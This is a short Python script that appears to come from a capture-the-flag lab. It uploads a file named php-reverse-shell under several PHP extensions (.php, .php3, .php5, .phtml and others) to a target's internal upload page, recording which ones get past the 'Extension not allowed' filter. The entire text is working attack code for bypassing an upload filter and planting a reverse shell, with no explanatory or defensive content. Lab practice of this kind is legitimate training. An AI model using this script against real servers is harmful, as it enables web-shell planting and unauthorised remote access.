import requests
import os

IP = "10.10.233.148"
URL = f"http://{IP}:3333/internal/index.php"

old_filename = "php-reverse-shell.php"

filename = "php-reverse-shell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = { "file": open(new_filename, "rb") }
    r = requests.post(URL, files=files)
    
    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} allowed")

    old_filename = new_filename